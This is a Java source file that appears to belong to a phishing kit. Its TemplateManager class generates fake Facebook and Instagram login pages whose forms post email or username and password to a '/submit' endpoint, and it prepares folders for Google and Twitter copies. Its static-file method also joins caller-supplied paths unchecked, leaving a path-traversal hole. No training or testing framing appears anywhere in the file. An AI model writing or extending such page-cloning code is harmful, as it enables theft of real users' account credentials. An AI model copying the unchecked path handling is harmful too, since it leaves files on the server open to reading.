package org.guercifzone;

import java.io.IOException;
import java.nio.file.*;

public class TemplateManager {
    private static final String TEMPLATES_DIR = "templates/";

    public TemplateManager() {
        createDefaultTemplates();
    }

    public String getTemplate(String templateName) throws IOException {
        Path path = Paths.get(TEMPLATES_DIR + templateName + "/index.html");
        return new String(Files.readAllBytes(path));
    }

    public String getStaticFile(String templateName, String filePath) throws IOException {
        Path path = Paths.get(TEMPLATES_DIR + templateName + filePath);
        return new String(Files.readAllBytes(path));
    }

    private void createDefaultTemplates() {
        createDirectoryStructure();
        createFacebookTemplate();
        createInstagramTemplate();
        // Add more templates as needed
    }

    private void createDirectoryStructure() {
        try {
            Files.createDirectories(Paths.get(TEMPLATES_DIR + "facebook"));
            Files.createDirectories(Paths.get(TEMPLATES_DIR + "instagram"));
            Files.createDirectories(Paths.get(TEMPLATES_DIR + "google"));
            Files.createDirectories(Paths.get(TEMPLATES_DIR + "twitter"));
        } catch (IOException e) {
            System.err.println("Error creating template directories: " + e.getMessage());
        }
    }

    private void createFacebookTemplate() {
        String html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In or Sign Up</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
                .container { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
                button { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; width: 100%; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Log in to Facebook</h2>
                <form action="/submit" method="post">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        """;

        try {
            Files.write(Paths.get(TEMPLATES_DIR + "facebook/index.html"), html.getBytes());
        } catch (IOException e) {
            System.err.println("Error creating Facebook template: " + e.getMessage());
        }
    }

    private void createInstagramTemplate() {
        String html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Instagram</title>
            <style>
                body { font-family: Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; }
                button { background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Instagram</h2>
                <form action="/submit" method="post">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        """;

        try {
            Files.write(Paths.get(TEMPLATES_DIR + "instagram/index.html"), html.getBytes());
        } catch (IOException e) {
            System.err.println("Error creating Instagram template: " + e.getMessage());
        }
    }
}